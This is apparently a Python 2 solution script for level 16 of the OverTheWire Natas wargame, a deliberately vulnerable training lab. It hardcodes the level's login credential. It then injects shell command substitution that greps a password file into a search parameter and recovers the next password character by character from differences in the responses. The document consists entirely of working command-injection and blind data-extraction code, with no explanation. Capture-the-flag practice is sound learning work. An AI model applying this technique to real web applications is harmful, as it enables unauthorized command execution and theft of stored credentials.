#!/usr/bin/env python
import requests
import string

url = "http://natas16.natas.labs.overthewire.org"
authUsername = "natas16"
authPassword = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"

chars = "".join([string.digits, string.ascii_letters])
print "Chars: " + chars

word = "Aprils"

passwordDir = []
for char in chars:
	uri = "".join([url, "?", "needle=$(grep ", char, " /etc/natas_webpass/natas17)", word])

	r = requests.get(uri, auth=(authUsername, authPassword))

	if word not in r.text:
		passwordDir.append(char)
		print "[#] Current letters in passsword: {0}".format("".join(passwordDir))

print "----------------------"
print "Trying the password..."
print "----------------------"

passwordChars = []
for i in range(32):
	
	for char in passwordDir:
		combo = "".join(["".join(passwordChars), char])

		uri = "".join([url, "?", "needle=$(grep ^", combo, " /etc/natas_webpass/natas17)", word])
		
		r = requests.get(uri, auth=(authUsername, authPassword))

		if word not in r.text:
			passwordChars.append(char)
			print "[#] Current length: {0} Current password: {1} ".format(len(passwordChars), "".join(passwordChars))
			break

print "[!!] Final password: {0}".format("".join(passwordChars))